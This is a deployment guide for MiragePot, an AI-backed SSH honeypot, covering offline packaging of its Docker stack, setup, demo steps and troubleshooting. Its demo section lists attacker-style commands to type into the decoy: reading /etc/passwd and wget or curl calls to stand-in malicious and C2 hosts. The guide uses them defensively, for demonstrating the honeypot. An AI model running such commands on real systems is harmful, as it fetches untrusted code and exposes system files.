# MiragePot Offline Deployment Guide

Complete guide for deploying MiragePot without internet access - essential for demos, air-gapped environments, or unreliable networks.

## Table of Contents

- [Overview](#overview)
- [Preparation Phase (With Internet)](#preparation-phase-with-internet)
- [Deployment Phase (No Internet)](#deployment-phase-no-internet)
- [Architecture](#architecture)
- [Troubleshooting](#troubleshooting)

---

## Overview

### Why Offline Deployment?

- **Conference/Classroom Demos** - Unreliable venue WiFi
- **Air-Gapped Environments** - Security requirements
- **Reproducibility** - Exact same versions every time
- **Speed** - No waiting for downloads during demo

### What Gets Packaged?

```
Total Size: ~6-7GB

Components:
├─ Docker Images (~4GB)
│  ├─ miragepot-honeypot (Python + dependencies)
│  ├─ ollama/ollama (LLM server)
│  ├─ prom/prometheus (Metrics database)
│  ├─ grafana/grafana (Dashboards)
│  └─ prom/alertmanager (Alert system)
│
├─ Ollama Model (~2GB)
│  └─ phi3:latest
│
└─ Source Code (~50MB)
   └─ MiragePot repository
```

---

## Preparation Phase (With Internet)

Do this **before** the demo, on a machine with good internet.

### Step 1: Clone Repository

```bash
git clone https://github.com/evinbrijesh/MiragePot.git
cd MiragePot
```

### Step 2: Build and Start Containers

This downloads all Docker images and builds the honeypot:

```bash
# Copy environment config
cp .env.docker.example .env.docker

# Build and start full stack
cd docker/
docker compose build
docker compose up -d

# Wait for containers to be healthy
docker compose ps
```

### Step 3: Download AI Model

```bash
# Pull phi3 model (~2GB, takes 2-5 minutes)
docker exec miragepot-ollama ollama pull phi3

# Verify it's downloaded
docker exec miragepot-ollama ollama list
# Should show: phi3:latest
```

### Step 4: Export Everything

Run the export script to package everything:

```bash
# Return to project root
cd ..

# Run the export script
./scripts/export-offline.sh

# This creates: miragepot-offline-bundle.tar.gz (~6-7GB)
```

**Manual Export (if script fails):**

```bash
# Export Docker images
docker save \
  miragepot-honeypot:latest \
  ollama/ollama:latest \
  prom/prometheus:latest \
  grafana/grafana:latest \
  prom/alertmanager:latest \
  -o miragepot-images.tar

# Export Ollama model
docker exec miragepot-ollama ollama list
docker run --rm -v ollama:/ollama -v $(pwd):/backup \
  alpine tar czf /backup/ollama-models.tar.gz -C /ollama .

# Stop containers
cd docker/
docker compose down

# Package everything
cd ..
tar czf miragepot-offline-bundle.tar.gz \
  miragepot-images.tar \
  ollama-models.tar.gz \
  .env.docker.example \
  docker/ \
  miragepot/ \
  dashboard/ \
  data/ \
  grafana/ \
  scripts/ \
  docs/ \
  requirements.txt \
  pyproject.toml \
  README.md \
  LICENSE \
  CONTRIBUTING.md

# Clean up temporary files
rm miragepot-images.tar ollama-models.tar.gz
```

### Step 5: Transfer to Demo Machine

Copy `miragepot-offline-bundle.tar.gz` to a USB drive or external storage.

**Verify integrity:**
```bash
# Create checksum
sha256sum miragepot-offline-bundle.tar.gz > miragepot-offline-bundle.sha256

# Later, verify on demo machine
sha256sum -c miragepot-offline-bundle.sha256
```

---

## Deployment Phase (No Internet)

On the demo machine (no internet required):

### Prerequisites

The demo machine must have:
- Docker installed (Docker Desktop on Mac/Windows, or Docker Engine on Linux)
- Docker Compose v2+
- ~10GB free disk space

**Install Docker (if not already installed):**
```bash
# Ubuntu/Debian
sudo apt-get install docker.io docker-compose-v2

# Or download Docker Desktop from another machine and install
```

### Step 1: Extract Bundle

```bash
# Copy bundle from USB drive
cp /path/to/usb/miragepot-offline-bundle.tar.gz ~/

# Extract
cd ~/
tar xzf miragepot-offline-bundle.tar.gz
cd MiragePot/
```

### Step 2: Load Docker Images

```bash
# Load all images (takes 2-3 minutes)
docker load -i miragepot-images.tar

# Verify images are loaded
docker images | grep -E 'miragepot|ollama|prometheus|grafana|alertmanager'
```

Expected output:
```
miragepot-honeypot    latest    abc123    ...
ollama/ollama         latest    def456    ...
prom/prometheus       latest    ghi789    ...
grafana/grafana       latest    jkl012    ...
prom/alertmanager     latest    mno345    ...
```

### Step 3: Restore Ollama Model

```bash
# Create Ollama volume
docker volume create ollama

# Restore model data
docker run --rm -v ollama:/ollama -v $(pwd):/backup \
  alpine tar xzf /backup/ollama-models.tar.gz -C /ollama
```

### Step 4: Configure Environment

```bash
# Copy environment file
cp .env.docker.example .env.docker

# Optional: Customize settings
nano .env.docker
```

### Step 5: Start Full Stack

```bash
cd docker/
docker compose up -d

# Wait for containers to start (10-15 seconds)
sleep 15

# Check status
docker compose ps
```

All containers should show "Up" or "Up (healthy)":
```
NAME                    STATUS
miragepot-honeypot      Up (healthy)
miragepot-ollama        Up (healthy)
miragepot-prometheus    Up
miragepot-grafana       Up
miragepot-alertmanager  Up
```

### Step 6: Verify Deployment

```bash
# Test SSH honeypot
nc -zv localhost 2222
# Output: Connection to localhost 2222 port [tcp/*] succeeded!

# Test Ollama model
docker exec miragepot-ollama ollama list
# Should show: phi3:latest

# Test Grafana
curl -s http://localhost:3000/api/health | grep database
# Output: "database":"ok"

# Test Prometheus
curl -s http://localhost:9091/-/healthy
# Output: Prometheus is Healthy.

# Test metrics endpoint
curl -s http://localhost:9090/metrics | head -3
# Should show Prometheus metrics
```

### Step 7: Access Services

All services are now running offline:

| Service | URL | Credentials |
|---------|-----|-------------|
| **SSH Honeypot** | `ssh root@localhost -p 2222` | Any password |
| **Streamlit Dashboard** | http://localhost:8501 | None |
| **Grafana** | http://localhost:3000 | admin / admin |
| **Prometheus** | http://localhost:9091 | None |
| **Alertmanager** | http://localhost:9093 | None |

---

## Architecture

### Offline Bundle Structure

```
miragepot-offline-bundle.tar.gz (6-7GB)
│
├── miragepot-images.tar (4GB)
│   ├── miragepot-honeypot:latest
│   ├── ollama/ollama:latest
│   ├── prom/prometheus:latest
│   ├── grafana/grafana:latest
│   └── prom/alertmanager:latest
│
├── ollama-models.tar.gz (2GB)
│   └── phi3:latest model data
│
└── MiragePot source code
    ├── docker/              (Compose files)
    ├── miragepot/           (Python package)
    ├── dashboard/           (Streamlit UI)
    ├── grafana/             (Pre-built dashboards)
    ├── scripts/             (Helper scripts)
    └── docs/                (Documentation)
```

### Container Network (Offline Mode)

```
┌─────────────────────────────────────────────────────────┐
│  Demo Machine (No Internet)                              │
│  ┌───────────────────────────────────────────────────┐  │
│  │  Docker Internal Network (miragepot-network)      │  │
│  │                                                    │  │
│  │   ┌──────────────┐         ┌──────────────┐      │  │
│  │   │  Honeypot    │────────▶│    Ollama    │      │  │
│  │   │  (SSH+UI)    │         │   (phi3 ✓)   │      │  │
│  │   └──────────────┘         └──────────────┘      │  │
│  │         │ metrics                                 │  │
│  │         ▼                                         │  │
│  │   ┌──────────────┐         ┌──────────────┐      │  │
│  │   │  Prometheus  │────────▶│   Grafana    │      │  │
│  │   │   (metrics)  │         │ (dashboards) │      │  │
│  │   └──────────────┘         └──────────────┘      │  │
│  │         │                                         │  │
│  │         ▼                                         │  │
│  │   ┌──────────────┐                               │  │
│  │   │ Alertmanager │                               │  │
│  │   │   (alerts)   │                               │  │
│  │   └──────────────┘                               │  │
│  │                                                    │  │
│  └───────────────────────────────────────────────────┘  │
│                                                          │
│  Exposed Ports (localhost only):                        │
│  • 2222  - SSH Honeypot                                 │
│  • 8501  - Streamlit Dashboard                          │
│  • 9090  - Metrics endpoint                             │
│  • 9091  - Prometheus UI                                │
│  • 9093  - Alertmanager UI                              │
│  • 3000  - Grafana UI                                   │
└─────────────────────────────────────────────────────────┘
```

**Key Point**: All containers communicate via internal Docker network. No external internet required once deployed.

---

## Demo Workflow

### Recommended Demo Sequence (10-15 minutes)

**1. Show Container Status (30 seconds)**
```bash
docker compose ps
docker stats --no-stream
```

**2. Demonstrate SSH Honeypot (3 minutes)**
```bash
# Terminal 1: Connect as attacker
ssh root@localhost -p 2222
# Password: anything

# Try commands:
whoami
uname -a
cat /etc/passwd
ls -la /root
wget http://malicious.com/script.sh
curl http://attacker-c2.com
```

**3. Show Live Monitoring (2 minutes)**

Open browser tabs:
- http://localhost:8501 - Streamlit dashboard (session logs)
- http://localhost:3000 - Grafana (metrics, TTPs)

**4. Explain Architecture (3 minutes)**

Show how:
- SSH server captures commands
- Ollama generates AI responses (show it works offline!)
- Prometheus collects metrics
- Grafana visualizes threats

**5. Show Session Logs (2 minutes)**
```bash
# View JSON logs
ls -lh data/logs/
cat data/logs/session_*.json | jq '.'

# Show metrics
curl http://localhost:9090/metrics | grep miragepot
```

**6. Q&A (5 minutes)**

Common questions:
- "How does it work without internet?" → Show offline bundle
- "What if attacker detects it?" → Show defense features
- "Can it handle real attacks?" → Show rate limiting, threat scoring

---

## Troubleshooting

### "Cannot connect to Docker daemon"

```bash
# Check Docker status
systemctl status docker

# Start Docker
sudo systemctl start docker

# Or restart Docker Desktop (Mac/Windows)
```

### "Image not found" after docker load

```bash
# Verify image file exists
ls -lh miragepot-images.tar

# Try loading again with verbose output
docker load -i miragepot-images.tar

# List loaded images
docker images
```

### "Ollama model not found"

```bash
# Check if volume was restored
docker volume inspect ollama

# Check model inside container
docker exec miragepot-ollama ls -la /root/.ollama/models/

# If missing, restore again:
docker run --rm -v ollama:/ollama -v $(pwd):/backup \
  alpine tar xzf /backup/ollama-models.tar.gz -C /ollama
```

### "Port already in use"

```bash
# Find what's using the port
sudo lsof -i :2222

# Kill the process or change port in docker-compose.yml
```

### "Container keeps restarting"

```bash
# Check logs
docker logs miragepot-honeypot

# Common issues:
# - .env.docker missing → cp .env.docker.example .env.docker
# - Permission issues → check volume mounts
# - Corrupted image → re-export and reload
```

### "Grafana dashboards not showing data"

```bash
# Check if Prometheus is scraping
curl http://localhost:9091/api/v1/targets

# Restart Grafana
docker restart miragepot-grafana

# Re-import dashboards
./scripts/setup-grafana-dashboards.sh
```

### "AI responses are slow/not working"

```bash
# Check Ollama status
docker exec miragepot-ollama ollama list

# Test Ollama directly
docker exec miragepot-ollama ollama run phi3 "Say hello"

# Check honeypot logs
docker logs miragepot-honeypot | grep -i ollama
```

---

## Bundle Size Optimization

If 6-7GB is too large for your USB drive:

### Option 1: Compress More Aggressively

```bash
# Use maximum compression (slower but smaller)
tar czf miragepot-offline-bundle.tar.gz --use-compress-program="gzip -9" ...
```

### Option 2: Use Smaller Model

```bash
# Instead of phi3 (~2GB), use phi3:mini (~1GB)
docker exec miragepot-ollama ollama pull phi3:mini

# Update .env.docker
MIRAGEPOT_LLM_MODEL=phi3:mini
```

### Option 3: Split Archive

```bash
# Split into 2GB chunks (for FAT32 USB drives)
tar czf - miragepot-offline-bundle | split -b 2G - miragepot-part-

# To extract later:
cat miragepot-part-* | tar xzf -
```

---

## Pre-Demo Checklist

**Day Before Demo:**
- [ ] Export offline bundle on machine with good internet
- [ ] Verify bundle integrity (sha256sum)
- [ ] Copy to USB drive (or cloud backup)
- [ ] Test extraction on demo machine
- [ ] Verify Docker is installed on demo machine
- [ ] Do a full dry-run deployment

**Day of Demo:**
- [ ] Bring USB drive with offline bundle
- [ ] Bring backup USB (redundancy!)
- [ ] Have Docker Desktop installer (just in case)
- [ ] Print out deployment commands
- [ ] Test venue power/projector

**5 Minutes Before:**
- [ ] Deploy full stack: `cd docker && docker compose up -d`
- [ ] Open browser tabs (Streamlit, Grafana)
- [ ] Connect SSH in one terminal
- [ ] Verify everything works

---

## Post-Demo Cleanup

```bash
# Stop all containers
cd docker/
docker compose down

# Optional: Remove volumes (keep if you want to preserve data)
docker compose down -v

# Optional: Remove images (frees 4GB)
docker rmi miragepot-honeypot ollama/ollama prom/prometheus grafana/grafana prom/alertmanager
```

---

## Next Steps

- **Practice the demo** - Do it 2-3 times before the real thing
- **Prepare Q&A answers** - See common questions above
- **Have backup plan** - USB drive fails? Have cloud copy
- **Record demo video** - Share with people who couldn't attend

---

**Pro Tip**: The first deployment from offline bundle takes ~2-3 minutes. Start it before you begin talking/presenting, so everything is ready when you need to demo!
